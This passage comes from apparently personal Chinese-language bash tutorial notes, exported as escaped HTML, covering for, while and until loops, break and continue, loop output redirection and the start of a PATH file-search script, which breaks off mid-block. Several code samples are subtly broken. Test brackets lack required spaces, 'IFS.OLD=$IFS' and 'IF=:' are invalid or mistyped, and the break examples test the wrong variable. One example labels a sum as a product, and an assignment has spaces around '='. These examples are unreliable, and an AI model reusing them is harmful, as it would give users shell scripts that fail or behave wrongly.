        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The next number is $i&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;multiple variable&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; (( &lt;span style=&quot;color: #FF8C00;&quot;&gt;a&lt;/span&gt;=1; &lt;span style=&quot;color: #FF8C00;&quot;&gt;b&lt;/span&gt;=10;a &amp;lt;= 10; a++, b++))
&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$a - $b&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
while 命令
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
格式：

&lt;/pre&gt;
&lt;p&gt;
while test command
do
other commands
done
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org5169e8e&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;while command test&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt;=10
&lt;span style=&quot;color: #FF1493;&quot;&gt;while&lt;/span&gt; [ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; -gt 0 ]
&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt;
        &lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt;=$[ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; - 1 ]
&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;
until 命令
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
until 命令和 while 命令完全相反。
格式：

&lt;/pre&gt;
&lt;p&gt;
until test command
do
other commands
done
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orge8dc170&quot;&gt;&lt;span class=&quot;linenr&quot;&gt;1: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;2: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;using the until command&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;3: &lt;/span&gt;&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt;=100
&lt;span class=&quot;linenr&quot;&gt;4: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;until&lt;/span&gt; [ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; -eq 0 ]
&lt;span class=&quot;linenr&quot;&gt;5: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;6: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;7: &lt;/span&gt;        &lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt;=$[ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; -25 ]
&lt;span class=&quot;linenr&quot;&gt;8: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;

&lt;li&gt;应用
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
循环处理文件数据-处理
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgaa91c18&quot;&gt;&lt;span class=&quot;linenr&quot;&gt; 1: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 2: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;changing the IFS value&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 3: &lt;/span&gt;IFS.OLD=$&lt;span style=&quot;color: #FF8C00;&quot;&gt;IFS&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 4: &lt;/span&gt;&lt;span style=&quot;color: #FF8C00;&quot;&gt;IFS&lt;/span&gt;=$&lt;span style=&quot;color: #CDC673;&quot;&gt;'\n'&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 5: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; entry&lt;span style=&quot;color: #FF1493;&quot;&gt; in&lt;/span&gt; $(cat /etc/passwd)
&lt;span class=&quot;linenr&quot;&gt; 6: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 7: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Values in $entry -&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 8: &lt;/span&gt;        &lt;span style=&quot;color: #FF8C00;&quot;&gt;IFS&lt;/span&gt;=:
&lt;span class=&quot;linenr&quot;&gt; 9: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; value&lt;span style=&quot;color: #FF1493;&quot;&gt; in&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;entry&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;10: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;11: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$value&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;12: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;13: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;14: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#35813;&amp;#33050;&amp;#26412;&amp;#20351;&amp;#29992;&amp;#20102;&amp;#20004;&amp;#20010;&amp;#19981;&amp;#21516;&amp;#30340; IFS &amp;#30340;&amp;#20540;&amp;#26469;&amp;#35299;&amp;#26512;&amp;#25968;&amp;#25454;&amp;#65292;&amp;#31532;&amp;#19968;&amp;#20010; IFS &amp;#20540;&amp;#35299;&amp;#26512;&amp;#20986; /etc/passwd &amp;#25991;&amp;#20214;&amp;#20013;&amp;#30340;&amp;#21333;&amp;#29420;&amp;#30340;&amp;#34892;&amp;#65292;&amp;#20869;&amp;#37096; for &amp;#24490;&amp;#29615;&amp;#25509;&amp;#30528;&amp;#23558; IFS &amp;#30340;&amp;#20540;&amp;#20462;&amp;#25913;&amp;#20026;&amp;#20882;&amp;#21495;&amp;#65292;&amp;#20801;&amp;#35768;&amp;#20320;&amp;#20174; /etc/passwd &amp;#30340;&amp;#34892;&amp;#20013;&amp;#35299;&amp;#26512;&amp;#20986;&amp;#21333;&amp;#29420;&amp;#30340;&amp;#20540;&amp;#12290;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a id=&quot;orgb1b304b&quot;&gt;&lt;/a&gt;break 命令&lt;br /&gt;
&lt;div class=&quot;outline-text-6&quot; id=&quot;text-4-3-3-0-4&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org7946c4e&quot;&gt;&lt;span class=&quot;linenr&quot;&gt; 1: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;bash&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 2: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;--------------------------------&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 3: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#36339;&amp;#20986;&amp;#21333;&amp;#20010;&amp;#24490;&amp;#29615;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 4: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;1.breaking out of a for loop&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 5: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; var1&lt;span style=&quot;color: #FF1493;&quot;&gt; in&lt;/span&gt; 1 2 3 4 5
&lt;span class=&quot;linenr&quot;&gt; 6: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 7: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; -eq 5]
&lt;span class=&quot;linenr&quot;&gt; 8: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 9: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;break&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;10: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;11: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Iteration number: $var1&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;12: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;13: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The for loop is completed&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;14: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;2.breaking out of a while loop&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;15: &lt;/span&gt;&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt;=1
&lt;span class=&quot;linenr&quot;&gt;16: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;while&lt;/span&gt; [ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; -lt 10 ]
&lt;span class=&quot;linenr&quot;&gt;17: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;18: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; -eq 5]
&lt;span class=&quot;linenr&quot;&gt;19: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;20: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;break&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;21: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;22: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Iteration number: $var1&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;23: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;24: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The while loop is completed&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;25: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;--------------------------------&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;26: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#36339;&amp;#20986;&amp;#20869;&amp;#37096;&amp;#24490;&amp;#29615;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;27: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;3.breaking out of an inner loop&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;28: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt;(( &lt;span style=&quot;color: #FF8C00;&quot;&gt;a&lt;/span&gt; = 1; a&amp;lt;4; a++))
&lt;span class=&quot;linenr&quot;&gt;29: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;30: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Outer loop: $a&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;31: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt;((&lt;span style=&quot;color: #FF8C00;&quot;&gt;b&lt;/span&gt; = 1; b&amp;lt;100; b++))
&lt;span class=&quot;linenr&quot;&gt;32: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;33: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; -eq 5]
&lt;span class=&quot;linenr&quot;&gt;34: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;35: &lt;/span&gt;                        &lt;span style=&quot;color: #FF1493;&quot;&gt;break&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;36: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;37: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Inner loop: $b&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;38: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;39: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;40: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;---------------------------------&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;41: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#36339;&amp;#20986;&amp;#22806;&amp;#37096;&amp;#24490;&amp;#29615;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;42: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;4.breaking out of an outer loop&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;43: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt;(( &lt;span style=&quot;color: #FF8C00;&quot;&gt;a&lt;/span&gt; = 1; a&amp;lt;4; a++))
&lt;span class=&quot;linenr&quot;&gt;44: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;45: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Outer loop: $a&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;46: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt;((&lt;span style=&quot;color: #FF8C00;&quot;&gt;b&lt;/span&gt; = 1; b&amp;lt;100; b++))
&lt;span class=&quot;linenr&quot;&gt;47: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;48: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; -eq 5]
&lt;span class=&quot;linenr&quot;&gt;49: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;50: &lt;/span&gt;                        &lt;span style=&quot;color: #FF1493;&quot;&gt;break&lt;/span&gt; 2
&lt;span class=&quot;linenr&quot;&gt;51: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;52: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Inner loop: $b&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;53: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;54: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a id=&quot;org32a7402&quot;&gt;&lt;/a&gt;continue 命令&lt;br /&gt;
&lt;div class=&quot;outline-text-6&quot; id=&quot;text-4-3-3-0-5&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org15babd1&quot;&gt;&lt;span class=&quot;linenr&quot;&gt; 1: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;1.using the continue command&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 2: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt;((&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; = 1; var1&amp;lt;15; var1++))
&lt;span class=&quot;linenr&quot;&gt; 3: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 4: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [$&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; -gt 5] &amp;amp;&amp;amp; [$&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; -lt 10]
&lt;span class=&quot;linenr&quot;&gt; 5: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 6: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;continue&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 7: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 8: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Iteration number: $var1&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt; 9: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;10: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;2.improperly using the continue command in a while loop&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;11: &lt;/span&gt;&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt;=1
&lt;span class=&quot;linenr&quot;&gt;12: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;while &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;while iteration: $var1&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;13: &lt;/span&gt;        [ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; -lt 15 ]
&lt;span class=&quot;linenr&quot;&gt;14: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;15: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; -gt 5] &amp;amp;&amp;amp; [$&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; -lt 10]
&lt;span class=&quot;linenr&quot;&gt;16: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;17: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;continue&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;18: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;19: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Inside iteration number: $var1&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;20: &lt;/span&gt;        &lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; = $[$&lt;span style=&quot;color: #FF8C00;&quot;&gt;var1&lt;/span&gt; +1]
&lt;span class=&quot;linenr&quot;&gt;21: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;22: &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;3.continuing an outer loop&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;23: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt;(( &lt;span style=&quot;color: #FF8C00;&quot;&gt;a&lt;/span&gt; = 1; a&amp;lt;5; a++))
&lt;span class=&quot;linenr&quot;&gt;24: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;25: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;Interation : $a&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;26: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt;((&lt;span style=&quot;color: #FF8C00;&quot;&gt;b&lt;/span&gt; = 1; b&amp;lt;3; b++))
&lt;span class=&quot;linenr&quot;&gt;27: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;28: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;if&lt;/span&gt; [ $&lt;span style=&quot;color: #FF8C00;&quot;&gt;b&lt;/span&gt; -gt 2] &amp;amp;&amp;amp; [$&lt;span style=&quot;color: #FF8C00;&quot;&gt;a&lt;/span&gt; -lt 4]
&lt;span class=&quot;linenr&quot;&gt;29: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;then&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;30: &lt;/span&gt;                        &lt;span style=&quot;color: #FF1493;&quot;&gt;continue&lt;/span&gt; 2
&lt;span class=&quot;linenr&quot;&gt;31: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;32: &lt;/span&gt;                &lt;span style=&quot;color: #FF8C00;&quot;&gt;var3&lt;/span&gt;=$[$&lt;span style=&quot;color: #FF8C00;&quot;&gt;a&lt;/span&gt;+$&lt;span style=&quot;color: #FF8C00;&quot;&gt;b&lt;/span&gt;]
&lt;span class=&quot;linenr&quot;&gt;33: &lt;/span&gt;                &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;The result of $a * $b is $var3&quot;&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;34: &lt;/span&gt;        &lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;linenr&quot;&gt;35: &lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a id=&quot;org372e069&quot;&gt;&lt;/a&gt;处理循环的输出&lt;br /&gt;
&lt;div class=&quot;outline-text-6&quot; id=&quot;text-4-3-3-0-6&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
可以对循环的输出使用管道或进行重定向，通过在 done 命令之后添加一个处理命令来实现：

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;orgb56da42&quot;&gt;for file in /home/zrg/*
do
...
done &amp;gt; output.txt
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a id=&quot;orgf144f57&quot;&gt;&lt;/a&gt;实例&lt;br /&gt;
&lt;div class=&quot;outline-text-6&quot; id=&quot;text-4-3-3-0-7&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;org0b62d8c&quot;&gt;#!/bin/bash
# finding files in the PATH
IF=:
for folder in $PATH
do
        echo &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$folder:&quot;&lt;/span&gt;
        for file in $folder/*
        do
                if [-x $file]
                then
